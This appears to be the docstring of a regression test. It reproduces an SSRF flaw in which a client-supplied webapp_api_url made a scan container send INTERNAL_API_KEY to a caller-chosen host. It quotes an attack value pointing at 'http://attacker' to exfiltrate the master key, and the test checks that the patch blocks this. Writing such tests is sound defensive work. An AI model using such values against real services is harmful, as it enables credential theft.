"""V2 — SSRF / INTERNAL_API_KEY leak via client-supplied ``webapp_api_url``.

Exploit (pre-patch): the ``/recon/start`` (and sibling) handlers forwarded the
request's ``webapp_api_url`` verbatim to the spawned scan container, which then
sends ``INTERNAL_API_KEY`` to it. A caller could therefore set
``webapp_api_url: http://attacker`` and exfiltrate the master key.

This is a *reproduction-as-test*: it drives the REAL handler with a malicious
``webapp_api_url`` and asserts the value forwarded to ``container_manager`` (and
thence to the spawned container's env + credentialed call) is the
server-controlled URL, never the attacker's. Run against the pre-patch code
(`git stash push -- recon_orchestrator/api.py`) it FAILS — the attacker URL is
captured — demonstrating the exploit; against the patched code it passes.

Run: python -m pytest tests/test_v2_ssrf_webapp_url.py -q
